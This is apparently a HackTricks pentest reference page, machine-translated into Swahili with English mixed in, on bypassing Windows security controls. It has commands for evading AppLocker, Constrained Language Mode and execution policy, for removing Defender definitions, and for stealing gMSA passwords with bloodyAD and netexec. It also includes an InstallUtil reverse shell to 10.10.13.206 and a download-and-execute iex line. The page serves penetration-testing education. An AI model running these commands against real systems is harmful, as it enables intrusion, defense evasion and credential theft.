# Udhibiti wa Usalama wa Windows

{{#include ../../banners/hacktricks-training.md}}

## Sera ya AppLocker

Orodha nyeupe ya programu ni orodha ya programu zilizoidhinishwa au faili zinazotekelezwa ambazo zinaruhusiwa kuwepo na kuendeshwa kwenye mfumo. Lengo ni kulinda mazingira dhidi ya malware yenye madhara na programu zisizoidhinishwa ambazo hazilingani na mahitaji maalum ya biashara ya shirika.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni suluhisho la Microsoft la **application whitelisting** na huwapa wasimamizi wa mfumo udhibiti juu ya **ni programu na faili gani watumiaji wanaweza kuendesha**. Inatoa **udhibiti wa undani** juu ya executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.\
Ni kawaida kwa mashirika **kuzuia cmd.exe na PowerShell.exe** na upatikanaji wa kuandika kwenye saraka fulani, **lakini yote haya yanaweza kuzungukwa**.

### Angalia

Angalia ni faili/upanuisaji gani ziko kwenye orodha nyeusi/nyeyeupe:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Njia hii ya rejista ina mipangilio na sera zinazotumika na AppLocker, ikitoa njia ya kupitia seti ya sasa ya kanuni zinazotekelezwa kwenye mfumo:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Folda muhimu **zinazoweza kuandikwa** za bypass sera ya AppLocker: Ikiwa AppLocker inaruhusu kuendesha chochote ndani ya `C:\Windows\System32` au `C:\Windows` kuna **folda zinazoweza kuandikwa** unaweza kutumia ili **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Mara nyingi **zinaaminika** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries zinaweza pia kuwa muhimu kupita AppLocker.
- **Kanuni zilizotungwa vibaya pia zinaweza kupitishwa**
- Kwa mfano, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, unaweza kuunda **kabrasha liitwalo `allowed`** mahali popote na litaruhusiwa.
- Mashirika pia mara nyingi hufanya mkazo wa **kuzuia the `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, lakini husahau kuhusu **other** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) kama `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` au `PowerShell_ISE.exe`.
- **DLL enforcement haizinduliwa mara chache sana** kutokana na mzigo wa ziada inaweza kuweka kwenye mfumo, na kiwango cha majaribio kinachohitajika kuhakikisha hakitavunjika kitu. Kwa hivyo kutumia **DLLs kama backdoors kuta kusaidia kupita AppLocker**.
- Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kuendesha **Powershell** code katika mchakato wowote na kupita AppLocker. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Credentials Storage

### Security Accounts Manager (SAM)

Local credentials zipo katika faili hii, nywila zimehashiwa.

### Local Security Authority (LSA) - LSASS

The **credentials** (hashed) zinaletwa **hifadhiwa** katika **memory** ya subsystem hii kwa sababu za Single Sign-On.\
**LSA** inadhibiti **security policy** ya eneo (sera za nywila, ruhusa za watumiaji...), **authentication**, **access tokens**...\
LSA itakuwa ile itakayefanya **check** kwa credentials zilizotolewa ndani ya faili ya **SAM** (kwa login ya ndani) na **zungumza** na **domain controller** ili ku-authenticate mtumiaji wa domain.

The **credentials** zimeshifadhiwa ndani ya **process LSASS**: Kerberos tickets, hashes NT na LM, nywila zinazoweza kufunuliwa kwa urahisi.

### LSA secrets

LSA inaweza kuhifadhi kwenye diski baadhi ya credentials:

- Nywila ya akaunti ya kompyuta ya Active Directory (domain controller isiyoweza kupatikana).
- Nywila za akaunti za huduma za Windows
- Nywila za scheduled tasks
- Zaidi (nywila za IIS applications...)

### NTDS.dit

Ni database ya Active Directory. Iko tu kwenye Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ni Antivirus inayopatikana katika Windows 10 na Windows 11, na kwenye toleo za Windows Server. Inazuia zana za kawaida za pentesting kama **`WinPEAS`**. Hata hivyo, kuna njia za **kupita kinga hizi**.

### Check

Ili kukagua **status** ya **Defender** unaweza kutekeleza PS cmdlet **`Get-MpComputerStatus`** (angalia thamani ya **`RealTimeProtectionEnabled`** kujua kama iko hai):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Ili kuorodhesha pia unaweza kuendesha:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS inalinda faili kupitia usimbaji, ikitumia **ufunguo simetriki** unayejulikana kama **File Encryption Key (FEK)**. Ufunguo huu unasimbwa kwa kutumia **funguo la umma** la mtumiaji na unahifadhiwa ndani ya $EFS **alternative data stream** ya faili iliyosimbwa. Wakati ufungaji (decryption) unabidi, **funguo binafsi** inayofanana na cheti dijitali la mtumiaji inatumiwa kufungua FEK kutoka kwenye mtiririko wa $EFS. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Matukio ya kufungua (decryption) bila kuamshwa na mtumiaji** ni pamoja na:

- Wakati faili au folda zinaposogezwa kwenye mfumo wa faili usio-EFS, kama [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), zinafufuliwa (decrypted) kwa njia ya moja kwa moja.
- Faili zilizofichwa zinazotumwa mtandaoni kwa kutumia itifaki ya SMB/CIFS zinafufuliwa kabla ya usafirishaji.

Njia hii ya usimbaji inaruhusu upatikanaji wa wazi kwa faili zilizofichwa kwa mmiliki. Hata hivyo, kubadilisha tu nywila ya mmiliki na kuingia haitawezi kuruhusu ufungaji.

Key Takeaways:

- EFS inatumia FEK simetriki, iliyosimbwa kwa funguo la umma la mtumiaji.
- Kufungua (decryption) kunatumia funguo binafsi la mtumiaji kupata FEK.
- Kufunguka kwa njia ya moja kwa moja hufanyika katika hali maalum, kama kunakokopiwa kwenye FAT32 au kusafirishwa mtandaoni.
- Faili zilizofichwa zinaweza kupatikana na mmiliki bila hatua za ziada.

### Check EFS info

Angalia kama **mtumiaji** ame**tumia** huduma hii kwa kuangalia kama njia hii ipo: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Angalia **nani** ana **ufikiaji** wa faili ukitumia `cipher /c \<file>\`  
Unaweza pia kutumia `cipher /e` na `cipher /d` ndani ya folda ili **encrypt** na **decrypt** faili zote

### Decrypting EFS files

#### Kuwa System Authority

Njia hii inahitaji **mtumiaji wa mwathiriwa** kuwa anae**endesha** **mchakato** ndani ya mwenyeji. Ikiwa hivyo ni kesi, kwa kutumia session za `meterpreter` unaweza kuiga token ya mchakato wa mtumiaji (`impersonate_token` kutoka `incognito`). Au unaweza tu `migrate` kwenda kwenye mchakato wa mtumiaji.

#### Kujua nywila za watumiaji


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Akaunti za Group Managed Service (gMSA)

Microsoft ilitengeneza **Group Managed Service Accounts (gMSA)** kurahisisha usimamizi wa akaunti za huduma katika miundombinu ya IT. Tofauti na akaunti za huduma za jadi ambazo mara nyingi zinawekwa na "Password never expire", gMSA zinatoa suluhisho salama zaidi na rahisi kusimamia:

- **Automatic Password Management**: gMSA zinatumia nywila tata ya herufi 240 inayobadilika kiotomatiki kulingana na sera ya domain au kompyuta. Mchakato huu unafanywa na Key Distribution Service (KDC) ya Microsoft, kuondoa haja ya masasisho ya nywila kwa mikono.
- **Enhanced Security**: Akaunti hizi hazina uwezekano wa kufungwa (lockouts) na haiwezi kutumika kwa ingia ya mtumiaji wa kisasa (interactive logins), jambo linaloimarisha usalama wao.
- **Multiple Host Support**: gMSA zinaweza kushirikiwa kati ya hosts nyingi, hivyo zinafaa kwa huduma zinazotumika kwenye server nyingi.
- **Scheduled Task Capability**: Tofauti na managed service accounts, gMSA zinaunga mkono kuendesha scheduled tasks.
- **Simplified SPN Management**: Mfumo hubadilisha kwa otomatiki Service Principal Name (SPN) pale panapobadilika sAMaccount details za kompyuta au jina la DNS, kurahisisha usimamizi wa SPN.

Nywila za gMSA zimo katika kipengele cha LDAP _**msDS-ManagedPassword**_ na zinasasishwa kiotomatiki kila siku 30 na Domain Controllers (DCs). Nywila hii, blob ya data iliyosimbwa inayojulikana kama [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), inaweza tu kutolewa na wasimamizi walioidhinishwa na servers ambazo gMSA zimewekwa, kuhakikisha mazingira salama. Ili kupata taarifa hii, inahitajika muunganisho uliolindwa kama LDAPS, au muunganisho lazima uwe authenticated na 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Unaweza kusoma nywila hii kwa kutumia [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Pia, angalia [web page](https://cube0x0.github.io/Relaying-for-gMSA/) kuhusu jinsi ya kufanya **NTLM relay attack** ili **kusoma** **nenosiri** la **gMSA**.

### Abusing ACL chaining to read gMSA managed password (GenericAll -> ReadGMSAPassword)

Katika mazingira mengi, watumiaji wenye ruhusa ndogo wanaweza kufikia siri za gMSA bila kuharibu DC kwa kunyanyasa ACLs za vitu zilizo na usanidi mbaya:

- Kundi unachoweza kudhibiti (kwa mfano, kupitia GenericAll/GenericWrite) kimetolewa ruhusa ya `ReadGMSAPassword` juu ya gMSA.
- Kwa kujiongeza kwenye kundi hilo, unapata haki ya kusoma blob ya `msDS-ManagedPassword` ya gMSA kupitia LDAP na kupata vigezo vya NTLM vinavyoweza kutumika.

Typical workflow:

1) Gundua njia kwa kutumia BloodHound na bainisha foothold principals zako kama Owned. Tafuta edges kama:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Jiongeze kwenye kundi la kati unalodhibiti (mfano kwa bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Soma nenosiri la gMSA lililodhibitiwa kupitia LDAP na pata hash ya NTLM. NetExec inafanya kwa otomatiki uondoaji wa `msDS-ManagedPassword` na kuibadilisha kuwa NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Thibitisha kama gMSA ukitumia NTLM hash (hakuna plaintext inayohitajika). Ikiwa akaunti iko katika Remote Management Users, WinRM itafanya kazi moja kwa moja:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notes:
- LDAP reads of `msDS-ManagedPassword` require sealing (e.g., LDAPS/sign+seal). Zana zinasimamia hili kiotomatiki.
- gMSAs are often granted local rights like WinRM; thibitisha uanachama wa vikundi (e.g., Remote Management Users) ili kupanga lateral movement.
- If you only need the blob to compute the NTLM yourself, see MSDS-MANAGEDPASSWORD_BLOB structure.



## LAPS

The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), inaruhusu usimamizi wa nywila za local Administrator. Nywila hizi, ambazo ni **randomized**, za kipekee, na **regularly changed**, zinahifadhiwa katikati katika Active Directory. Upataji wa nywila hizi umepunguzwa kupitia ACLs kwa watumiaji walioidhinishwa. Ikiwa ruhusa za kutosha zimepewa, uwezo wa kusoma nywila za admin wa ndani unapatikana.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **inazuia vipengele vingi** vinavyohitajika kutumia PowerShell kwa ufanisi, kama vile kuzuia COM objects, kuruhusu tu aina za .NET zilizokubaliwa, XAML-based workflows, PowerShell classes, na zaidi.

### **Angalia**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Katika Windows za sasa Bypass hiyo haitafanya kazi lakini unaweza kutumia[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Ili kuikompaila huenda ukahitaji** **_Ongeza Marejeo_** -> _Vinjari_ -> _Vinjari_ -> ongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **badilisha mradi kuwa .Net4.5**.

#### Moja kwa moja bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **execute Powershell** code katika mchakato wowote na bypass constrained mode. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Sera ya Utekelezaji ya PS

Kwa chaguo-msingi imewekwa kuwa **restricted.** Njia kuu za bypass sera hii:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Taarifa zaidi zinaweza kupatikana [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Kiolesura cha Security Support Provider (SSPI)

Ni API inayoweza kutumika kuthibitisha watumiaji.

SSPI itakuwa na jukumu la kupata itifaki inayofaa kwa mashine mbili zinazotaka kuwasiliana. Njia inayopendekezwa kwa hili ni Kerberos. Kisha SSPI itajadili ni itifaki gani ya uthibitishaji itakayotumika; itifaki hizi za uthibitishaji zinaitwa Security Support Provider (SSP), ziko ndani ya kila mashine ya Windows kwa muundo wa DLL na mashine zote mbili lazima ziunge mkono ile ile ili ziweze kuwasiliana.

### SSP kuu

- **Kerberos**: Inayopendekezwa
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Kwa sababu za utangamano
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Seva za wavuti na LDAP, nywila katika fomu ya hash ya MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL na TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Inatumika kujadiliana itifaki itakayotumika (Kerberos au NTLM, Kerberos ikiwa chaguo-msingi)
- %windir%\Windows\System32\lsasrv.dll

#### Mazungumzo yanaweza kutoa njia kadhaa au njia moja tu.

## UAC - Udhibiti wa Akaunti ya Mtumiaji (User Account Control)

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **ombi la ridhaa kwa shughuli zinazohitaji ruhusa za juu**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Marejeo

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
